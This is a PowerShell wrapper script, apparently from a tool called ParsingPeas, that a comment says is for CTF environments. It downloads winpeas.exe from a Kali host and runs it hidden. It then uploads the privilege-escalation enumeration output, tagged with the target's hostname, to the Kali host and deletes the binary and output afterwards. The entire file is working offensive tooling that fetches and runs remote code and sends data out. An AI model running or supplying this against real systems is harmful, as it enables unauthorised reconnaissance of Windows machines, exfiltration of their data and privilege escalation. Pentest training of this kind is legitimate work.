# ParsingPeas Wrapper Script (PowerShell)
# Runs winpeas and automatically sends output to Kali host
# NOTE: Downloads scripts from Kali host (for isolated CTF environments)
# Compatible with PowerShell 2.0+

param(
    [string]$ServerUrl = "KALI_SERVER_URL"  # Will be replaced by receiver.py
)

$ErrorActionPreference = "Stop"

$SessionId = "scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$PID"
$Hostname = $env:COMPUTERNAME
if (-not $Hostname) { $Hostname = "unknown" }
$TmpOutput = "$env:TEMP\.winpeas_$(Get-Date -Format 'yyyyMMdd_HHmmss').tmp"

Write-Host "[*] ParsingPeas - Automated Privilege Escalation Scanner" -ForegroundColor Cyan
Write-Host "[*] Session ID: $SessionId" -ForegroundColor Cyan
Write-Host "[*] Hostname: $Hostname" -ForegroundColor Cyan
Write-Host "[*] Server: $ServerUrl" -ForegroundColor Cyan
Write-Host ""

$ScanType = "winpeas"
Write-Host "[*] Detected: Windows system" -ForegroundColor Yellow
$ScriptEndpoint = "$ServerUrl/get-winpeas"
$ScriptPath = "$env:TEMP\winpeas.exe"

Write-Host "[*] Downloading $ScanType from Kali host..." -ForegroundColor Yellow

# Download script from Kali host using WebClient (PowerShell 2.0+ compatible)
try {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($ScriptEndpoint, $ScriptPath)
    $WebClient.Dispose()
} catch {
    Write-Host "[!] Download failed: $_" -ForegroundColor Red
    exit 1
}

if (-not (Test-Path $ScriptPath) -or (Get-Item $ScriptPath).Length -eq 0) {
    Write-Host "[!] Error: Script download failed or empty" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Downloaded successfully" -ForegroundColor Green

Write-Host "[*] Running winpeas (this may take 2-5 minutes)..." -ForegroundColor Yellow
Write-Host "[*] Output is being saved to file..." -ForegroundColor Yellow
Write-Host ""

# Run winpeas and capture output
try {
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName = $ScriptPath
    $ProcessInfo.RedirectStandardOutput = $true
    $ProcessInfo.RedirectStandardError = $true
    $ProcessInfo.UseShellExecute = $false
    $ProcessInfo.CreateNoWindow = $true
    
    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo = $ProcessInfo
    
    Write-Host "[*] Winpeas running..." -ForegroundColor Yellow
    $Process.Start() | Out-Null
    
    # Read output while process is running
    $Output = $Process.StandardOutput.ReadToEnd()
    $ErrorOutput = $Process.StandardError.ReadToEnd()
    
    $Process.WaitForExit()
    $ExitCode = $Process.ExitCode
    
    # Combine output and errors
    $FullOutput = $Output
    if ($ErrorOutput) {
        $FullOutput += "`n`n=== STDERR ===`n" + $ErrorOutput
    }
    
    # Save to temp file
    [System.IO.File]::WriteAllText($TmpOutput, $FullOutput)
    
    Write-Host ""
    Write-Host "[+] Winpeas completed with exit code: $ExitCode" -ForegroundColor Green
    
} catch {
    Write-Host "[!] Error running winpeas: $_" -ForegroundColor Red
    exit 1
}

# Check if output was generated
if (-not (Test-Path $TmpOutput) -or (Get-Item $TmpOutput).Length -eq 0) {
    Write-Host "[!] Error: No output generated" -ForegroundColor Red
    exit 1
}

$OutputSize = (Get-Item $TmpOutput).Length
Write-Host "[+] Final output size: $([Math]::Round($OutputSize / 1KB, 2)) KB" -ForegroundColor Green
Write-Host ""
Write-Host "[*] Last 10 lines of output:" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Yellow
Get-Content $TmpOutput -Tail 10 | ForEach-Object { Write-Host $_ }
Write-Host "----------------------------------------" -ForegroundColor Yellow
Write-Host ""
Write-Host "[*] Transferring to Kali host..." -ForegroundColor Yellow
Write-Host ""

# Send to Kali with retry logic using WebClient (PowerShell 2.0+ compatible)
$MaxRetries = 3
$RetryCount = 0
$Success = $false

while ($RetryCount -lt $MaxRetries -and -not $Success) {
    Write-Host "[*] Upload attempt $($RetryCount + 1)/$MaxRetries" -ForegroundColor Yellow
    
    try {
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("X-Session-ID", $SessionId)
        $WebClient.Headers.Add("X-Hostname", $Hostname)
        $WebClient.Headers.Add("X-Scan-Type", $ScanType)
        $WebClient.Headers.Add("Content-Type", "text/plain")
        
        $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
        
        $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
        $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
        
        Write-Host "[+] Transfer successful!" -ForegroundColor Green
        
        # Try to extract report URL from response
        try {
            # Simple regex to extract report_url from JSON (no ConvertFrom-Json in PS 2.0)
            if ($ResponseText -match '"report_url"\s*:\s*"([^"]+)"') {
                $ReportUrl = $matches[1]
                Write-Host "[+] View report at: $ServerUrl$ReportUrl" -ForegroundColor Green
            }
        } catch {
            # Ignore parse errors
        }
        
        $WebClient.Dispose()
        $Success = $true
        
    } catch {
        $RetryCount++
        Write-Host "[!] Transfer failed: $_" -ForegroundColor Red
        if ($RetryCount -lt $MaxRetries) {
            Write-Host "[*] Retrying in 2 seconds..." -ForegroundColor Yellow
            Start-Sleep -Seconds 2
        }
    }
}

if ($Success) {
    Write-Host "[+] Cleaning up..." -ForegroundColor Green
    Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $TmpOutput -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Done!" -ForegroundColor Green
    exit 0
} else {
    Write-Host "[!] Transfer failed after $MaxRetries attempts" -ForegroundColor Red
    Write-Host "[*] Output saved locally at: $TmpOutput" -ForegroundColor Yellow
    Write-Host "[*] You can manually transfer the file" -ForegroundColor Yellow
    exit 1
}
